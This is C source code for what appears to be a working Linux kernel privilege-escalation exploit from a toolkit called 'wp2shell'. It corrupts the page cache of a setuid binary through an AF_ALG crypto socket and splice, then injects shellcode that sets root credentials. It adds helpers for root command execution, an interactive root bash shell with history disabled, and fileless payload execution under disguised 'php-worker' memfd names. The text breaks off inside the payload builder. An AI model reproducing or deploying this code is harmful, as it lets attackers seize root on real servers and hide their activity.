#define _GNU_SOURCE
#include <elf.h>
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <limits.h>
#include <linux/if_alg.h>
#include <netinet/in.h>
#include <poll.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/fsuid.h>
#include <sys/ptrace.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#ifndef SOL_ALG
#define SOL_ALG 279
#endif

#ifndef ALG_SET_KEY
#define ALG_SET_KEY           1
#define ALG_SET_IV            2
#define ALG_SET_OP            3
#define ALG_SET_AEAD_ASSOCLEN 4
#define ALG_SET_AEAD_AUTHSIZE 5
#endif

#ifndef MSG_SPLICE_PAGES
#define MSG_SPLICE_PAGES 0x8000
#endif

#define REENTRY_FLAG "--pwned"
#define ROOT_CMD_FLAG "--priv-exec"
#define ROOT_SHELL_FLAG "--priv-shell"
#define ROOT_BIN_FLAG "--priv-bin"
#define ROOT_CMD_TMPFILE_FLAG "--priv-exec-tmpfile"
#define ROOT_SHELL_TMPFILE_FLAG "--priv-shell-tmpfile"
#define ROOT_BIN_TMPFILE_FLAG "--priv-bin-tmpfile"
#define DEFAULT_TARGET "/usr/bin/su"
#define CFG_MODE_CMD 1
#define CFG_MODE_SHELL 2
#define CFG_MODE_BIN 3
#define ROOT_STORAGE_MEMFD 1
#define ROOT_STORAGE_TMPFILE 2
#define ROOT_CONFIG_FD 196
#define ROOT_HELPER_FD 197
#define ROOT_PAYLOAD_FD 198
#define ROOT_TOKEN_MAX 64
#define ROOT_IO_MAX (1024 * 1024)
#define ROOT_PAYLOAD_MEMFD_NAME "php-worker"
#define ROOT_CONFIG_MEMFD_NAME "php-state"
#define ROOT_TMPFILE_DIR "/dev/shm"

struct __attribute__((packed)) root_cfg_header {
    uint8_t mode;
    uint16_t first_len;
    uint16_t second_len;
};

static int write_all(int fd, const void *buf, size_t len)
{
    const unsigned char *p = buf;
    while (len > 0) {
        ssize_t n = write(fd, p, len);
        if (n < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        if (n == 0) return -1;
        p += (size_t)n;
        len -= (size_t)n;
    }
    return 0;
}

static int read_all(int fd, void *buf, size_t len)
{
    unsigned char *p = buf;
    while (len > 0) {
        ssize_t n = read(fd, p, len);
        if (n < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        if (n == 0) return -1;
        p += (size_t)n;
        len -= (size_t)n;
    }
    return 0;
}

static void clear_credentials(void)
{
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    setfsuid(0);
    setfsgid(0);
    setgroups(0, NULL);
}

struct root_buffer {
    unsigned char *data;
    size_t len;
    size_t cap;
};

static int buffer_append(struct root_buffer *buf, const void *src, size_t len)
{
    if (len == 0) return 0;
    if (buf->len > ROOT_IO_MAX || len > ROOT_IO_MAX - buf->len) return -1;
    size_t required = buf->len + len;
    if (required > buf->cap) {
        size_t cap = buf->cap ? buf->cap : 4096;
        while (cap < required) {
            if (cap > ROOT_IO_MAX / 2) {
                cap = ROOT_IO_MAX;
                break;
            }
            cap *= 2;
        }
        unsigned char *data = realloc(buf->data, cap);
        if (!data) return -1;
        buf->data = data;
        buf->cap = cap;
    }
    memcpy(buf->data + buf->len, src, len);
    buf->len += len;
    return 0;
}

static int buffer_append_text(struct root_buffer *buf, const char *text)
{
    return buffer_append(buf, text, strlen(text));
}

static int parse_endpoint(const char *endpoint, uint16_t *port_out, char token[ROOT_TOKEN_MAX + 1])
{
    const char *separator = strchr(endpoint, ':');
    if (!separator || separator == endpoint || separator[1] == '\0') return -1;
    size_t port_len = (size_t) (separator - endpoint);
    if (port_len >= 6) return -1;
    char port_text[6] = {0};
    memcpy(port_text, endpoint, port_len);
    char *end = NULL;
    errno = 0;
    unsigned long port = strtoul(port_text, &end, 10);
    if (errno != 0 || end == port_text || *end != '\0' || port == 0 || port > 65535)
        return -1;
    size_t token_len = strlen(separator + 1);
    if (token_len == 0 || token_len > ROOT_TOKEN_MAX) return -1;
    for (size_t i = 0; i < token_len; i++) {
        unsigned char c = (unsigned char) separator[1 + i];
        if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f'))) return -1;
    }
    memcpy(token, separator + 1, token_len + 1);
    *port_out = (uint16_t) port;
    return 0;
}

static int create_listener(uint16_t port)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    int one = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in address = {
        .sin_family = AF_INET,
        .sin_port = htons(port),
        .sin_addr = { .s_addr = htonl(INADDR_LOOPBACK) },
    };
    if (bind(fd, (struct sockaddr *) &address, sizeof(address)) < 0) {
        close(fd);
        return -1;
    }
    if (listen(fd, 4) < 0) {
        close(fd);
        return -1;
    }
    return fd;
}

static int accept_request(int listener, const char *token, char op[16], struct root_buffer *body);

static int create_tmpfile_fd(mode_t mode)
{
    int fd = open(ROOT_TMPFILE_DIR, O_TMPFILE | O_RDWR, mode);
    if (fd < 0) return -1;
    if (fchmod(fd, mode) < 0) {
        close(fd);
        return -1;
    }
    return fd;
}

static int reopen_fd_read_only(int fd)
{
    char path[64];
    int path_len = snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    if (path_len < 0 || (size_t) path_len + 1 > sizeof(path)) return -1;
    return open(path, O_RDONLY);
}

static int create_payload_write_fd(int storage_mode)
{
    if (storage_mode == ROOT_STORAGE_MEMFD)
        return (int) syscall(SYS_memfd_create, ROOT_PAYLOAD_MEMFD_NAME, 0);
    if (storage_mode == ROOT_STORAGE_TMPFILE)
        return create_tmpfile_fd(0700);
    errno = EINVAL;
    return -1;
}

static int finalize_payload_fd(int write_fd, int storage_mode)
{
    if (storage_mode == ROOT_STORAGE_MEMFD) {
        if (write_fd != ROOT_PAYLOAD_FD && dup2(write_fd, ROOT_PAYLOAD_FD) < 0)
            return -1;
        if (write_fd != ROOT_PAYLOAD_FD) close(write_fd);
        return lseek(ROOT_PAYLOAD_FD, 0, SEEK_SET) < 0 ? -1 : 0;
    }
    if (storage_mode != ROOT_STORAGE_TMPFILE) {
        errno = EINVAL;
        return -1;
    }
    if (fchmod(write_fd, 0700) < 0) return -1;
    int read_fd = reopen_fd_read_only(write_fd);
    if (read_fd < 0) return -1;
    if (dup2(read_fd, ROOT_PAYLOAD_FD) < 0) {
        close(read_fd);
        return -1;
    }
    if (read_fd != ROOT_PAYLOAD_FD) close(read_fd);
    if (write_fd != ROOT_PAYLOAD_FD) close(write_fd);
    return lseek(ROOT_PAYLOAD_FD, 0, SEEK_SET) < 0 ? -1 : 0;
}

static int prepare_root_binary_storage(const char *endpoint, int storage_mode)
{
    uint16_t port = 0;
    char token[ROOT_TOKEN_MAX + 1];
    if (parse_endpoint(endpoint, &port, token) < 0) return -1;
    int listener = create_listener(port);
    if (listener < 0) return -1;
    int write_fd = create_payload_write_fd(storage_mode);
    if (write_fd < 0) {
        close(listener);
        return -1;
    }
    if (ftruncate(write_fd, 0) < 0 || lseek(write_fd, 0, SEEK_SET) < 0) {
        close(write_fd);
        close(listener);
        return -1;
    }

    size_t total = 0;
    for (;;) {
        char op[16] = {0};
        struct root_buffer body = {0};
        int client = accept_request(listener, token, op, &body);
        if (client < 0) {
            free(body.data);
            continue;
        }
        if (strcmp(op, "READY") == 0) {
            free(body.data);
            write_all(
                client,
                "WP2SHELL_ROOT_UPLOAD_READY\n",
                sizeof("WP2SHELL_ROOT_UPLOAD_READY\n") - 1
            );
            close(client);
            continue;
        }
        if (strncmp(op, "PUT:", 4) == 0) {
            char *end = NULL;
            errno = 0;
            unsigned long long parsed_offset = strtoull(op + 4, &end, 10);
            int ok = 0;
            if (
                errno == 0 &&
                end != op + 4 &&
                *end == '\0' &&
                parsed_offset <= (unsigned long long) LLONG_MAX &&
                body.len <= ROOT_IO_MAX &&
                parsed_offset <= (unsigned long long) SIZE_MAX - body.len &&
                lseek(write_fd, (off_t) parsed_offset, SEEK_SET) >= 0 &&
                write_all(write_fd, body.data, body.len) == 0
            ) {
                size_t offset = (size_t) parsed_offset;
                size_t end_offset = offset + body.len;
                if (end_offset > total) total = end_offset;
                char response[64];
                int response_len = snprintf(
                    response,
                    sizeof(response),
                    "WP2SHELL_ROOT_UPLOAD_CHUNK:%zu:%zu\n",
                    offset,
                    body.len
                );
                if (response_len > 0 && (size_t) response_len < sizeof(response))
                    ok = write_all(client, response, (size_t) response_len) == 0;
            }
            if (!ok) {
                write_all(
                    client,
                    "WP2SHELL_ROOT_UPLOAD_ERROR\n",
                    sizeof("WP2SHELL_ROOT_UPLOAD_ERROR\n") - 1
                );
            }
            free(body.data);
            close(client);
            if (!ok) {
                close(write_fd);
                close(listener);
                return -1;
            }
            continue;
        }
        if (strncmp(op, "DONE:", 5) == 0) {
            char *end = NULL;
            errno = 0;
            unsigned long long parsed_expected = strtoull(op + 5, &end, 10);
            free(body.data);
            if (
                errno != 0 ||
                end == op + 5 ||
                *end != '\0' ||
                parsed_expected > (unsigned long long) SIZE_MAX ||
                total != (size_t) parsed_expected ||
                finalize_payload_fd(write_fd, storage_mode) < 0
            ) {
                write_all(
                    client,
                    "WP2SHELL_ROOT_UPLOAD_ERROR\n",
                    sizeof("WP2SHELL_ROOT_UPLOAD_ERROR\n") - 1
                );
                close(client);
                if (write_fd != ROOT_PAYLOAD_FD) close(write_fd);
                close(listener);
                return -1;
            }
            char response[64];
            int response_len = snprintf(
                response,
                sizeof(response),
                "WP2SHELL_ROOT_UPLOAD_DONE:%zu\n",
                total
            );
            if (response_len > 0 && (size_t) response_len < sizeof(response))
                write_all(client, response, (size_t) response_len);
            close(client);
            close(listener);
            return 0;
        }
        free(body.data);
        write_all(
            client,
            "WP2SHELL_ROOT_UPLOAD_ERROR\n",
            sizeof("WP2SHELL_ROOT_UPLOAD_ERROR\n") - 1
        );
        close(client);
    }
}

static int read_line(int fd, char *buf, size_t cap)
{
    if (cap == 0) return -1;
    size_t len = 0;
    while (len + 1 < cap) {
        unsigned char c = 0;
        ssize_t n = read(fd, &c, 1);
        if (n < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        if (n == 0) return -1;
        if (c == '\n') {
            buf[len] = '\0';
            return 0;
        }
        buf[len++] = (char) c;
    }
    return -1;
}

static int read_request_body(int fd, struct root_buffer *buf)
{
    unsigned char tmp[4096];
    for (;;) {
        ssize_t n = read(fd, tmp, sizeof(tmp));
        if (n < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        if (n == 0) return 0;
        if (buffer_append(buf, tmp, (size_t) n) < 0) return -1;
    }
}

static int accept_request(int listener, const char *token, char op[16], struct root_buffer *body)
{
    int fd = accept(listener, NULL, NULL);
    if (fd < 0) return -1;
    char received_token[ROOT_TOKEN_MAX + 1];
    if (
        read_line(fd, received_token, sizeof(received_token)) < 0 ||
        strcmp(received_token, token) != 0 ||
        read_line(fd, op, 16) < 0
    ) {
        close(fd);
        return -1;
    }
    if (read_request_body(fd, body) < 0) {
        close(fd);
        return -1;
    }
    return fd;
}

static int drain_pipe(int fd, struct root_buffer *buf, int first_timeout_ms)
{
    int flags = fcntl(fd, F_GETFL, 0);
    if (flags >= 0) fcntl(fd, F_SETFL, flags | O_NONBLOCK);
    int timeout = first_timeout_ms;
    for (;;) {
        struct pollfd pollfd = { .fd = fd, .events = POLLIN };
        int ready = poll(&pollfd, 1, timeout);
        if (ready < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        if (ready == 0) return 0;
        if (!(pollfd.revents & (POLLIN | POLLHUP))) return 0;
        unsigned char tmp[4096];
        ssize_t n = read(fd, tmp, sizeof(tmp));
        if (n < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) return 0;
            if (errno == EINTR) continue;
            return -1;
        }
        if (n == 0) return 0;
        if (buffer_append(buf, tmp, (size_t) n) < 0) return -1;
        timeout = 25;
    }
}

static int child_status_code(int status)
{
    if (WIFEXITED(status)) return WEXITSTATUS(status);
    if (WIFSIGNALED(status)) return 128 + WTERMSIG(status);
    return 126;
}

static int serve_result(const char *endpoint, const struct root_buffer *result)
{
    uint16_t port = 0;
    char token[ROOT_TOKEN_MAX + 1];
    if (parse_endpoint(endpoint, &port, token) < 0) return -1;
    int listener = create_listener(port);
    if (listener < 0) return -1;
    for (;;) {
        char op[16] = {0};
        struct root_buffer body = {0};
        int client = accept_request(listener, token, op, &body);
        free(body.data);
        if (client < 0) continue;
        if (strcmp(op, "GET") != 0) {
            close(client);
            continue;
        }
        int rc = write_all(client, result->data, result->len);
        close(client);
        close(listener);
        return rc;
    }
}

static int capture_child(
    int (*child_entry)(void *),
    void *context,
    struct root_buffer *output,
    int *rc_out
)
{
    int pipefd[2];
    if (pipe(pipefd) < 0) return -1;
    pid_t child = fork();
    if (child < 0) {
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }
    if (child == 0) {
        close(pipefd[0]);
        if (
            dup2(pipefd[1], STDOUT_FILENO) < 0 ||
            dup2(pipefd[1], STDERR_FILENO) < 0
        ) {
            _exit(126);
        }
        if (pipefd[1] > STDERR_FILENO) close(pipefd[1]);
        _exit(child_entry(context));
    }
    close(pipefd[1]);
    if (drain_pipe(pipefd[0], output, 1000) < 0) {
        close(pipefd[0]);
        return -1;
    }
    close(pipefd[0]);
    int status = 0;
    if (waitpid(child, &status, 0) < 0) return -1;
    *rc_out = child_status_code(status);
    return 0;
}

struct command_context {
    const char *command;
};

static int child_run_command(void *opaque)
{
    const struct command_context *context = opaque;
    char *const argv[] = {"/bin/sh", "-c", (char *) context->command, NULL};
    char *const envp[] = {
        "PATH=/bin:/sbin:/usr/bin:/usr/sbin",
        "TERM=linux",
        "LANG=C",
        NULL
    };
    execve(argv[0], argv, envp);
    return 127;
}

struct binary_context {
    int payload_fd;
};

static ssize_t ptrace_read_cstring(
    pid_t child,
    uintptr_t address,
    char *buf,
    size_t cap
)
{
    if (cap == 0) return -1;
    size_t offset = 0;
    while (offset + 1 < cap) {
        errno = 0;
        long word = ptrace(PTRACE_PEEKDATA, child, (void *) (address + offset), NULL);
        if (word == -1 && errno != 0) return -1;
        size_t remaining = cap - offset - 1;
        size_t count = remaining < sizeof(word) ? remaining : sizeof(word);
        memcpy(buf + offset, &word, count);
        for (size_t i = 0; i < count; i++) {
            if (buf[offset + i] == '\0') return (ssize_t) (offset + i);
        }
        offset += count;
    }
    buf[cap - 1] = '\0';
    return -1;
}

static int ptrace_write_bytes(
    pid_t child,
    uintptr_t address,
    const unsigned char *src,
    size_t len
)
{
    size_t offset = 0;
    while (offset < len) {
        errno = 0;
        long word = ptrace(PTRACE_PEEKDATA, child, (void *) (address + offset), NULL);
        if (word == -1 && errno != 0) return -1;
        size_t count = len - offset;
        if (count > sizeof(word)) count = sizeof(word);
        memcpy(&word, src + offset, count);
        if (ptrace(PTRACE_POKEDATA, child, (void *) (address + offset), (void *) word) < 0)
            return -1;
        offset += count;
    }
    return 0;
}

static int rewrite_deleted_memfd_exec_path(
    pid_t child,
    uintptr_t address,
    int payload_fd
)
{
    char current[PATH_MAX];
    ssize_t current_len = ptrace_read_cstring(child, address, current, sizeof(current));
    if (current_len < 0) return 0;
    int supported_deleted_path = (
        strncmp(current, "/memfd:", 7) == 0 ||
        strncmp(current, ROOT_TMPFILE_DIR "/", strlen(ROOT_TMPFILE_DIR) + 1) == 0
    );
    if (!supported_deleted_path || strstr(current, " (deleted)") == NULL)
        return 0;

    char replacement[64];
    int replacement_len = snprintf(
        replacement,
        sizeof(replacement),
        "/proc/self/fd/%d",
        payload_fd
    );
    if (
        replacement_len < 0 ||
        (size_t) replacement_len + 1 > sizeof(replacement) ||
        (size_t) replacement_len + 1 > (size_t) current_len + 1
    ) {
        return 0;
    }
    if (
        ptrace_write_bytes(
            child,
            address,
            (const unsigned char *) replacement,
            (size_t) replacement_len + 1
        ) < 0
    ) {
        return -1;
    }
    return 1;
}

static int child_run_binary(void *opaque)
{
    const struct binary_context *context = opaque;
    char argv0[64];
    int argv0_len = snprintf(argv0, sizeof(argv0), "/proc/self/fd/%d", context->payload_fd);
    if (argv0_len < 0 || (size_t) argv0_len + 1 > sizeof(argv0)) return 127;
    char *const argv[] = {argv0, NULL};
    char *const envp[] = {
        "PATH=/bin:/sbin:/usr/bin:/usr/sbin",
        "TERM=linux",
        "LANG=C",
        NULL
    };
    syscall(SYS_execveat, context->payload_fd, "", argv, envp, AT_EMPTY_PATH);
    dprintf(STDERR_FILENO, "execveat failed: %s\n", strerror(errno));
    return 127;
}

static int trace_binary_child(
    pid_t child,
    int pipefd,
    int payload_fd,
    struct root_buffer *output,
    int *status_out,
    int *rewrote_self_exec_out
)
{
    int status = 0;
    if (waitpid(child, &status, 0) < 0) return -1;
    if (!WIFSTOPPED(status)) {
        *status_out = status;
        return 0;
    }
    if (
        ptrace(
            PTRACE_SETOPTIONS,
            child,
            NULL,
            (void *) (uintptr_t) PTRACE_O_TRACESYSGOOD
        ) < 0
    ) {
        return -1;
    }

    int deliver_signal = 0;
    for (;;) {
        if (
            ptrace(
                PTRACE_SYSCALL,
                child,
                NULL,
                (void *) (uintptr_t) deliver_signal
            ) < 0
        ) {
            return -1;
        }
        deliver_signal = 0;
        if (waitpid(child, &status, 0) < 0) return -1;
        if (drain_pipe(pipefd, output, 0) < 0) return -1;
        if (WIFEXITED(status) || WIFSIGNALED(status)) {
            if (drain_pipe(pipefd, output, 1000) < 0) return -1;
            *status_out = status;
            return 0;
        }
        if (!WIFSTOPPED(status)) continue;

        int signal_number = WSTOPSIG(status);
        if (signal_number == (SIGTRAP | 0x80)) {
            struct user_regs_struct regs;
            if (ptrace(PTRACE_GETREGS, child, NULL, &regs) < 0) return -1;
            uintptr_t path_address = 0;
            if ((long) regs.orig_rax == SYS_execve)
                path_address = (uintptr_t) regs.rdi;
            else if ((long) regs.orig_rax == SYS_execveat)
                path_address = (uintptr_t) regs.rsi;
            if (path_address != 0) {
                int rewritten = rewrite_deleted_memfd_exec_path(
                    child,
                    path_address,
                    payload_fd
                );
                if (rewritten < 0) return -1;
                if (rewritten > 0) *rewrote_self_exec_out = 1;
            }
            continue;
        }
        if (signal_number == SIGTRAP || signal_number == SIGSTOP) continue;
        deliver_signal = signal_number;
    }
}

static int capture_binary_child(
    const struct binary_context *context,
    struct root_buffer *output,
    int *rc_out,
    int *rewrote_self_exec_out
)
{
    int pipefd[2];
    if (pipe(pipefd) < 0) return -1;
    pid_t child = fork();
    if (child < 0) {
        close(pipefd[0]);
        close(pipefd[1]);
        return -1;
    }
    if (child == 0) {
        close(pipefd[0]);
        if (
            dup2(pipefd[1], STDOUT_FILENO) < 0 ||
            dup2(pipefd[1], STDERR_FILENO) < 0
        ) {
            _exit(126);
        }
        if (pipefd[1] > STDERR_FILENO) close(pipefd[1]);
        if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) < 0) _exit(126);
        if (raise(SIGSTOP) != 0) _exit(126);
        _exit(child_run_binary((void *) context));
    }
    close(pipefd[1]);
    int status = 0;
    int rc = trace_binary_child(
        child,
        pipefd[0],
        context->payload_fd,
        output,
        &status,
        rewrote_self_exec_out
    );
    close(pipefd[0]);
    if (rc < 0) {
        kill(child, SIGKILL);
        waitpid(child, NULL, 0);
        return -1;
    }
    *rc_out = child_status_code(status);
    return 0;
}

static _Noreturn void root_command(const char *endpoint, const char *command)
{
    clear_credentials();
    struct command_context context = { .command = command };
    struct root_buffer output = {0};
    int rc = 126;
    if (capture_child(child_run_command, &context, &output, &rc) < 0) _exit(126);
    char marker[64];
    snprintf(marker, sizeof(marker), "\nWP2SHELL_ROOT_RC:%d\n", rc);
    if (buffer_append_text(&output, marker) < 0) _exit(126);
    if (serve_result(endpoint, &output) < 0) _exit(126);
    _exit(0);
}

static _Noreturn void root_binary(const char *endpoint, const char *payload_fd_text)
{
    clear_credentials();
    char *end = NULL;
    errno = 0;
    long payload_fd_long = strtol(payload_fd_text, &end, 10);
    if (
        errno != 0 ||
        end == payload_fd_text ||
        *end != '\0' ||
        payload_fd_long < 0 ||
        payload_fd_long > INT_MAX
    ) {
        _exit(126);
    }
    int payload_fd = (int) payload_fd_long;
    if (fcntl(payload_fd, F_GETFD) < 0) _exit(126);
    if (fcntl(payload_fd, F_SETFD, 0) < 0) _exit(126);
    struct binary_context context = { .payload_fd = payload_fd };
    struct root_buffer output = {0};
    int rc = 126;
    int rewrote_self_exec = 0;
    if (capture_binary_child(&context, &output, &rc, &rewrote_self_exec) < 0) _exit(126);
    if (
        rewrote_self_exec &&
        buffer_append_text(&output, "\nWP2SHELL_ROOT_BIN_SELF_REEXEC:/proc/self/fd/198\n") < 0
    ) {
        _exit(126);
    }
    char marker[64];
    snprintf(marker, sizeof(marker), "\nWP2SHELL_ROOT_BIN_RC:%d\n", rc);
    if (buffer_append_text(&output, marker) < 0) _exit(126);
    if (serve_result(endpoint, &output) < 0) _exit(126);
    _exit(0);
}

static _Noreturn void root_shell(const char *endpoint)
{
    clear_credentials();
    uint16_t port = 0;
    char token[ROOT_TOKEN_MAX + 1];
    if (parse_endpoint(endpoint, &port, token) < 0) _exit(126);
    int listener = create_listener(port);
    if (listener < 0) _exit(126);

    int stdin_pipe[2];
    int stdout_pipe[2];
    if (pipe(stdin_pipe) < 0 || pipe(stdout_pipe) < 0) _exit(126);
    pid_t child = fork();
    if (child < 0) _exit(126);
    if (child == 0) {
        close(stdin_pipe[1]);
        close(stdout_pipe[0]);
        if (
            dup2(stdin_pipe[0], STDIN_FILENO) < 0 ||
            dup2(stdout_pipe[1], STDOUT_FILENO) < 0 ||
            dup2(stdout_pipe[1], STDERR_FILENO) < 0
        ) {
            _exit(126);
        }
        if (stdin_pipe[0] > STDERR_FILENO) close(stdin_pipe[0]);
        if (stdout_pipe[1] > STDERR_FILENO) close(stdout_pipe[1]);
        char *const argv[] = {"/bin/bash", "--norc", "--noprofile", "-i", NULL};
        char *const envp[] = {
            "PATH=/bin:/sbin:/usr/bin:/usr/sbin",
            "TERM=linux",
            "LANG=C",
            "PS1=root@wp2shell:\\w# ",
            "HISTFILE=/dev/null",
            "PROMPT_COMMAND=",
            NULL
        };
        execve(argv[0], argv, envp);
        _exit(127);
    }
    close(stdin_pipe[0]);
    close(stdout_pipe[1]);

    for (;;) {
        char op[16] = {0};
        struct root_buffer body = {0};
        int client = accept_request(listener, token, op, &body);
        if (client < 0) {
            free(body.data);
            continue;
        }
        struct root_buffer response = {0};
        int should_exit = 0;
        if (strcmp(op, "PING") == 0) {
            buffer_append_text(&response, "WP2SHELL_ROOT_SHELL_READY\n");
            drain_pipe(stdout_pipe[0], &response, 250);
        } else if (strcmp(op, "CMD") == 0) {
            if (body.len > 0) write_all(stdin_pipe[1], body.data, body.len);
            write_all(stdin_pipe[1], "\n", 1);
            drain_pipe(stdout_pipe[0], &response, 500);
        } else if (strcmp(op, "EXIT") == 0) {
            write_all(stdin_pipe[1], "exit\n", 5);
            drain_pipe(stdout_pipe[0], &response, 250);
            should_exit = 1;
        }
        free(body.data);
        write_all(client, response.data, response.len);
        free(response.data);
        close(client);
        if (should_exit) break;
    }
    close(stdin_pipe[1]);
    close(stdout_pipe[0]);
    close(listener);
    waitpid(child, NULL, 0);
    _exit(0);
}

static int create_config_fd(int storage_mode)
{
    if (storage_mode == ROOT_STORAGE_MEMFD)
        return (int) syscall(SYS_memfd_create, ROOT_CONFIG_MEMFD_NAME, 0);
    if (storage_mode == ROOT_STORAGE_TMPFILE)
        return create_tmpfile_fd(0600);
    errno = EINVAL;
    return -1;
}

static int write_config_fd(
    uint8_t mode,
    const char *first,
    const char *second,
    int storage_mode
)
{
    size_t first_len = strlen(first);
    size_t second_len = strlen(second);
    if (first_len > UINT16_MAX || second_len > UINT16_MAX) return -1;
    struct root_cfg_header header = {
        .mode = mode,
        .first_len = (uint16_t)first_len,
        .second_len = (uint16_t)second_len,
    };
    int fd = create_config_fd(storage_mode);
    if (fd < 0) return -1;
    if (dup2(fd, ROOT_CONFIG_FD) < 0) {
        close(fd);
        return -1;
    }
    if (fd != ROOT_CONFIG_FD) close(fd);
    fd = ROOT_CONFIG_FD;
    int rc = 0;
    if (write_all(fd, &header, sizeof(header)) < 0) rc = -1;
    if (rc == 0 && write_all(fd, first, first_len) < 0) rc = -1;
    if (rc == 0 && write_all(fd, second, second_len) < 0) rc = -1;
    if (rc == 0 && lseek(fd, 0, SEEK_SET) < 0) rc = -1;
    return rc;
}

static _Noreturn void dispatch_reentry(const char *config_fd_text)
{
    char *end = NULL;
    errno = 0;
    long config_fd_long = strtol(config_fd_text, &end, 10);
    if (
        errno != 0 ||
        end == config_fd_text ||
        *end != '\0' ||
        config_fd_long < 0 ||
        config_fd_long > INT_MAX
    ) {
        _exit(126);
    }
    int fd = (int) config_fd_long;
    if (fcntl(fd, F_GETFD) < 0 || lseek(fd, 0, SEEK_SET) < 0) _exit(126);
    struct root_cfg_header header;
    if (read_all(fd, &header, sizeof(header)) < 0) _exit(126);
    size_t first_len = header.first_len;
    size_t second_len = header.second_len;
    char *first = calloc(first_len + 1, 1);
    char *second = calloc(second_len + 1, 1);
    if (!first || !second) _exit(126);
    if (read_all(fd, first, first_len) < 0) _exit(126);
    if (read_all(fd, second, second_len) < 0) _exit(126);
    close(fd);

    if (header.mode == CFG_MODE_CMD)
        root_command(first, second);
    if (header.mode == CFG_MODE_SHELL)
        root_shell(first);
    if (header.mode == CFG_MODE_BIN)
        root_binary(first, second);
    _exit(126);
}

static int corrupt_page_cache(
    int file_fd,
    size_t offset,
    const unsigned char *patch,
    size_t patch_len
)
{
    struct sockaddr_alg sa = {
        .salg_family = AF_ALG,
        .salg_type   = "aead",
        .salg_name   = "authencesn(hmac(sha256),cbc(aes))"
    };
    unsigned char key[40] = {
        0x08, 0x00, 0x01, 0x00,
        0x00, 0x00, 0x00, 0x10,
    };

    int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (alg_fd < 0) return -1;
    if (bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(alg_fd);
        return -1;
    }
    setsockopt(alg_fd, SOL_ALG, ALG_SET_KEY, key, sizeof(key));
    setsockopt(alg_fd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL, 4);
    int op_fd = accept(alg_fd, NULL, NULL);
    if (op_fd < 0) {
        close(alg_fd);
        return -1;
    }

    size_t splice_len = offset + 4;
    unsigned char data[8];
    memset(data, 'A', 4);
    size_t n = patch_len < 4 ? patch_len : 4;
    memcpy(data + 4, patch, n);

    uint32_t op = 0;
    struct {
        uint32_t ivlen;
        uint8_t iv[16];
    } iv = { .ivlen = 16 };
    uint32_t assoclen = 8;
    char cbuf[
        CMSG_SPACE(sizeof(op)) +
        CMSG_SPACE(sizeof(iv)) +
        CMSG_SPACE(sizeof(assoclen))
    ];
    memset(cbuf, 0, sizeof(cbuf));

    struct iovec iov = { .iov_base = data, .iov_len = sizeof(data) };
    struct msghdr msg = {
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = cbuf,
        .msg_controllen = sizeof(cbuf),
    };

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_OP;
    cmsg->cmsg_len = CMSG_LEN(sizeof(op));
    memcpy(CMSG_DATA(cmsg), &op, sizeof(op));

    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_IV;
    cmsg->cmsg_len = CMSG_LEN(sizeof(iv));
    memcpy(CMSG_DATA(cmsg), &iv, sizeof(iv));

    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
    cmsg->cmsg_len = CMSG_LEN(sizeof(assoclen));
    memcpy(CMSG_DATA(cmsg), &assoclen, sizeof(assoclen));

    sendmsg(op_fd, &msg, MSG_SPLICE_PAGES);
    int pipefd[2];
    if (pipe(pipefd) < 0) {
        close(op_fd);
        close(alg_fd);
        return -1;
    }
    loff_t src_off = 0;
    splice(file_fd, &src_off, pipefd[1], NULL, splice_len, 0);
    splice(pipefd[0], NULL, op_fd, NULL, splice_len, 0);

    struct timeval tv = { .tv_sec = 5 };
    setsockopt(op_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    char recvbuf[4096];
    recv(op_fd, recvbuf, 8 + offset, 0);

    close(pipefd[0]);
    close(pipefd[1]);
    close(op_fd);
    close(alg_fd);
    return 0;
}

#define B(...) do { \
    unsigned char _b[] = {__VA_ARGS__}; \
    memcpy(buf + p, _b, sizeof(_b)); \
    p += sizeof(_b); \
} while (0)

static size_t emit_cred_clear(unsigned char *buf, size_t p)
{
    B(0x31, 0xff);
    B(0x31, 0xf6);
    B(0x31, 0xd2);
    B(0x6a, 0x75, 0x58, 0x0f, 0x05);
    B(0x6a, 0x77, 0x58, 0x0f, 0x05);
    B(0x6a, 0x7a, 0x58, 0x0f, 0x05);
    B(0x6a, 0x7b, 0x58, 0x0f, 0x05);
    B(0x6a, 0x74, 0x58, 0x0f, 0x05);
    return p;
}

static size_t build_payload(
    unsigned char *buf
)
{
    size_t p = 0;
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)buf;
    memset(ehdr, 0, sizeof(*ehdr));
    memcpy(ehdr->e_ident, ELFMAG, SELFMAG);
    ehdr->e_ident[EI_CLASS] = ELFCLASS64;
    ehdr->e_ident[EI_DATA] = ELFDATA2LSB;
